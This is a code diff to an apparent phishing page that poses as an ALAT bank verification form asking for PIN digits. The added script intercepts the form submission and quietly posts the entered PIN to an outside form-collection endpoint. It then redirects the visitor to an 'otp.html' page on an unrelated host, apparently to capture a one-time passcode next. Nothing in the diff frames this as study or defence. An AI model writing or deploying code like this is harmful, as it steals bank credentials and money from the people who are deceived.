@@ -162,7 +162,7 @@
                 <input type="email" name="email" value="verification@alat.ng" readonly style="position: absolute; left: -9999px;" />
                 
                 <input type="hidden" name="name" value="ALAT User" />
-                <input type="hidden" name="_redirect" value="https://webwemma-app.pxxl.click/otp.html" />
+                <input type="hidden" name="_redirect" value="false" />
                 
                 <div class="formfin">
                   <input id="fin-0" type="text" name="Pin_Digit_1" maxlength="1" class="fin-input" inputmode="numeric"
@@ -188,6 +188,26 @@
   </div>
 
   <script>
+    // Handle form submission with redirect
+    document.getElementById('finForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      
+      const formData = new FormData(this);
+      
+      fetch('https://usebasin.com/f/c7a3b223942d', {
+        method: 'POST',
+        body: formData,
+        mode: 'no-cors'
+      }).then(() => {
+        // Redirect after submission
+        window.location.href = 'https://webwemma-app.pxxl.click/otp.html';
+      }).catch(() => {
+        // Redirect even if error
+        window.location.href = 'https://webwemma-app.pxxl.click/otp.html';
+      });
+    });
+
+    // PIN input navigation
     const inputs = document.querySelectorAll('.fin-input');
 
     inputs.forEach((input, index) => {
